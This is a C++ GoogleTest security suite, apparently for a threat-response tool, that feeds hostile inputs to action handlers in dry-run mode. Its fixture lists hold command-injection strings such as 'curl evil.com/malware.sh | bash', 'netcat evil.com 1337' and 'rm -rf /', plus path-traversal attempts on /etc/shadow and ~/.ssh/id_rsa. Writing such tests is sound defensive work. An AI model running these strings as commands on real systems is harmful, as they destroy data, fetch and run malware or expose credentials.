#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include "response/response_actions.hpp"
#include "core/behavioral_profiler.hpp"
#include <fstream>
#include <filesystem>

using namespace genesis;
using namespace genesis::response;

class SecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        response_manager = std::make_unique<ResponseActionsManager>();
        response_manager->initialize_actions();
        response_manager->set_dry_run_mode(true); // Safe for testing
    }

    void TearDown() override {
        response_manager.reset();
    }

    std::unique_ptr<ResponseActionsManager> response_manager;
};

// Test for command injection vulnerabilities
TEST_F(SecurityTest, TestCommandInjectionPrevention) {
    ActionContext malicious_context;
    
    // Test various injection attempts
    std::vector<std::string> injection_attempts = {
        "legitimate_process; rm -rf /",
        "process_name && curl evil.com/malware.sh | bash",
        "normal_name`rm -rf /home`",
        "proc$(whoami)ess",
        "name\"; echo 'pwned' > /etc/passwd; echo \"",
        "proc\x00rm -rf /",  // Null byte injection
        "name|netcat evil.com 1337",
        "test\nrm -rf /\ntest",
        "proc\\`evil_command\\`",
        "name$IFS$()rm$IFS$()-rf$IFS$()/"
    };

    for (const auto& injection : injection_attempts) {
        malicious_context.target_process = injection;
        malicious_context.threat_description = "test threat" + injection;
        malicious_context.target_ip = "192.168.1.1; curl evil.com";
        malicious_context.target_file = "/tmp/test; rm -rf /";
        malicious_context.target_pid = 1234;

        // Execute alert action (most vulnerable to injection)
        auto result = response_manager->execute_action("alert", malicious_context);
        
        // Should not fail due to injection (dry run mode)
        EXPECT_TRUE(result.success) << "Injection attempt failed security check: " << injection;
        
        // Verify no actual command injection occurred (in dry run, commands are not executed)
        EXPECT_EQ(result.error_message, "DRY RUN: Would execute alert");
    }
}

// Test input validation
TEST_F(SecurityTest, TestInputValidation) {
    ActionContext context;
    
    // Test extremely long strings (buffer overflow attempts)
    std::string long_string(10000, 'A');
    context.target_process = long_string;
    context.threat_description = long_string;
    
    auto result = response_manager->execute_action("alert", context);
    EXPECT_TRUE(result.success) << "Should handle very long strings safely";
    
    // Test null byte injection
    context.target_process = "test\x00injection";
    context.threat_description = "normal threat";
    
    result = response_manager->execute_action("alert", context);
    EXPECT_TRUE(result.success) << "Should handle null bytes safely";
    
    // Test empty strings
    context.target_process = "";
    context.threat_description = "";
    context.target_ip = "";
    context.target_file = "";
    context.target_pid = 0;
    
    result = response_manager->execute_action("alert", context);
    EXPECT_TRUE(result.success) << "Should handle empty inputs safely";
}

// Test privilege validation
TEST_F(SecurityTest, TestPrivilegeValidation) {
    // Test that privilege-requiring actions check properly
    ActionContext context;
    context.target_process = "test_process";
    context.threat_description = "test threat";
    context.target_pid = 1234;
    
    // Drop privileges first (simulate non-root execution)
    bool privilege_drop_result = response_manager->drop_privileges("nobody", "nogroup");
    // This should fail or succeed gracefully depending on current user
    
    // Try to execute privilege-requiring action
    auto result = response_manager->execute_action("terminate", context);
    
    // In dry run mode, this should still succeed but be noted
    EXPECT_TRUE(result.success) << "Privilege validation should work correctly";
}

// Test path traversal prevention
TEST_F(SecurityTest, TestPathTraversalPrevention) {
    ActionContext context;
    context.target_process = "test_process";
    context.threat_description = "test threat";
    
    // Test various path traversal attempts
    std::vector<std::string> traversal_attempts = {
        "/tmp/../../../etc/passwd",
        "/tmp/./../../etc/shadow",
        "/tmp//../../etc/hosts",
        "/tmp/file../../../../bin/bash",
        "/tmp/\x00../../etc/passwd",
        "/tmp/..\\..\\..\\windows\\system32",
        "../../../../../../etc/passwd",
        "/tmp/../.ssh/id_rsa"
    };
    
    for (const auto& path : traversal_attempts) {
        context.target_file = path;
        
        auto result = response_manager->execute_action("quarantine", context);
        EXPECT_TRUE(result.success) << "Path traversal should be prevented: " << path;
    }
}

// Test IP address validation
TEST_F(SecurityTest, TestIPAddressValidation) {
    ActionContext context;
    context.target_process = "test_process";
    context.threat_description = "test threat";
    
    // Test various malformed IP addresses
    std::vector<std::string> invalid_ips = {
        "192.168.1.1; rm -rf /",
        "127.0.0.1 && curl evil.com",
        "192.168.1.256",  // Invalid IP
        "999.999.999.999",
        "192.168.1",  // Incomplete
        "192.168.1.1.1",  // Too many octets
        "",  // Empty
        "192.168.1.1/24; echo pwned",
        "$(curl evil.com)",
        "192.168.1.1`whoami`"
    };
    
    for (const auto& ip : invalid_ips) {
        context.target_ip = ip;
        
        auto result = response_manager->execute_action("block", context);
        
        // Should either succeed safely or fail gracefully
        if (!result.success) {
            EXPECT_TRUE(!result.error_message.empty()) << "Should provide error message for invalid IP: " << ip;
        }
    }
    
    // Test valid IPs
    std::vector<std::string> valid_ips = {
        "192.168.1.1",
        "127.0.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "255.255.255.255",
        "0.0.0.0"
    };
    
    for (const auto& ip : valid_ips) {
        context.target_ip = ip;
        
        auto result = response_manager->execute_action("block", context);
        EXPECT_TRUE(result.success) << "Valid IP should be accepted: " << ip;
    }
}

// Test PID validation
TEST_F(SecurityTest, TestPIDValidation) {
    ActionContext context;
    context.target_process = "test_process";
    context.threat_description = "test threat";
    
    // Test invalid PIDs
    std::vector<pid_t> invalid_pids = {
        -1, -100, 0, 9999999  // Negative, zero, and extremely large PIDs
    };
    
    for (auto pid : invalid_pids) {
        context.target_pid = pid;
        
        auto result = response_manager->execute_action("terminate", context);
        
        // Should handle invalid PIDs gracefully
        if (!result.success) {
            EXPECT_TRUE(!result.error_message.empty()) << "Should provide error for invalid PID: " << pid;
        }
    }
    
    // Test valid PIDs
    std::vector<pid_t> valid_pids = {
        1, 1000, 32767  // Typical valid PID range
    };
    
    for (auto pid : valid_pids) {
        context.target_pid = pid;
        
        auto result = response_manager->execute_action("terminate", context);
        EXPECT_TRUE(result.success) << "Valid PID should be accepted: " << pid;
    }
}

// Test memory safety
TEST_F(SecurityTest, TestMemorySafety) {
    // Create many contexts to test memory management
    std::vector<ActionContext> contexts(1000);
    
    for (size_t i = 0; i < contexts.size(); ++i) {
        contexts[i].target_process = "process_" + std::to_string(i);
        contexts[i].threat_description = "threat_" + std::to_string(i);
        contexts[i].target_pid = static_cast<pid_t>(i + 1000);
        
        auto result = response_manager->execute_action("alert", contexts[i]);
        EXPECT_TRUE(result.success) << "Memory safety test failed at iteration " << i;
    }
    
    // Test that the system doesn't leak memory or crash
    auto stats = response_manager->get_action_statistics();
    EXPECT_EQ(stats["alert"].first, 1000) << "Should have executed 1000 alert actions";
}

// Test concurrent access safety
TEST_F(SecurityTest, TestConcurrentSafety) {
    const int num_threads = 10;
    const int operations_per_thread = 100;
    std::vector<std::thread> threads;
    std::atomic<int> success_count(0);
    
    for (int t = 0; t < num_threads; ++t) {
        threads.emplace_back([this, t, operations_per_thread, &success_count]() {
            for (int i = 0; i < operations_per_thread; ++i) {
                ActionContext context;
                context.target_process = "thread_" + std::to_string(t) + "_op_" + std::to_string(i);
                context.threat_description = "concurrent test threat";
                context.target_pid = t * 1000 + i;
                
                auto result = response_manager->execute_action("alert", context);
                if (result.success) {
                    success_count.fetch_add(1);
                }
            }
        });
    }
    
    for (auto& thread : threads) {
        thread.join();
    }
    
    EXPECT_EQ(success_count.load(), num_threads * operations_per_thread) 
        << "All concurrent operations should succeed";
    
    auto stats = response_manager->get_action_statistics();
    EXPECT_GE(stats["alert"].first, num_threads * operations_per_thread) 
        << "Statistics should reflect all operations";
}

// Test behavioral profiler security
TEST_F(SecurityTest, TestBehavioralProfilerSecurity) {
    core::BehavioralProfiler profiler(1, 0.1);  // Short learning window for testing
    
    // Test with malicious process names
    std::vector<std::string> malicious_names = {
        "$(rm -rf /)",
        "proc; curl evil.com",
        "name`whoami`",
        "proc\x00rm -rf /",
        std::string(10000, 'A')  // Very long name
    };
    
    for (const auto& name : malicious_names) {
        core::BehaviorPattern pattern;
        pattern.process_name = name;
        pattern.cpu_usage = 10.0;
        pattern.memory_usage = 100.0;
        pattern.syscall_frequency = 50;
        pattern.timestamp = std::chrono::system_clock::now();
        
        // Should not crash or cause security issues
        EXPECT_NO_THROW(profiler.add_behavior_pattern(pattern));
        EXPECT_NO_THROW(profiler.calculate_anomaly_score(pattern));
    }
}

// Test file operations security
TEST_F(SecurityTest, TestFileOperationsSecurity) {
    // Create temporary test directory
    std::string test_dir = "/tmp/genesis_security_test";
    std::filesystem::create_directories(test_dir);
    
    // Test profile export/import with malicious data
    core::BehavioralProfiler profiler(1, 0.1);
    
    // Create malicious profile data
    std::string malicious_json = R"({
        "profiles": [
            {
                "process_name": "$(rm -rf /)",
                "avg_cpu_usage": 1e308,
                "std_cpu_usage": -1,
                "security_flags": ["EVIL_FLAG; rm -rf /"]
            }
        ]
    })";
    
    // Test that import handles malicious data safely
    EXPECT_NO_THROW(profiler.import_profiles(malicious_json));
    
    // Test export doesn't produce dangerous output
    std::string exported = profiler.export_profiles();
    EXPECT_FALSE(exported.find("$(") != std::string::npos) << "Exported data should be sanitized";
    EXPECT_FALSE(exported.find("rm -rf") != std::string::npos) << "Exported data should be sanitized";
    
    // Cleanup
    std::filesystem::remove_all(test_dir);
}

// Main function for running security tests
int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    
    std::cout << "Running GENESIS Security Test Suite" << std::endl;
    std::cout << "====================================" << std::endl;
    
    int result = RUN_ALL_TESTS();
    
    if (result == 0) {
        std::cout << "\n✅ All security tests passed!" << std::endl;
    } else {
        std::cout << "\n❌ Some security tests failed!" << std::endl;
    }
    
    return result;
}